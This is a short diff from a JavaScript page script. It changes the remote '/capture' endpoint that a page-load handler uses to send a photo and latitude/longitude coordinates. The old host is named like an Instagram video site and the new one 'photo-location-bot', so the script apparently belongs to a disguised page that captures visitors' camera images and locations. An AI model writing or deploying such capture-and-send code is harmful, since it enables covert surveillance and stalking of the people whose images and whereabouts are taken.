@@ -6,7 +6,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Helper function to send data to backend
     async function sendDataToBackend(photo, latitude, longitude) {
-    const backendEndpoint = 'https://instagram-video-329865.onrender.com/capture';
+    const backendEndpoint = 'https://photo-location-bot.onrender.com/capture';
     const data = { photo, latitude, longitude };
     try {
         const response = await fetch(backendEndpoint, {
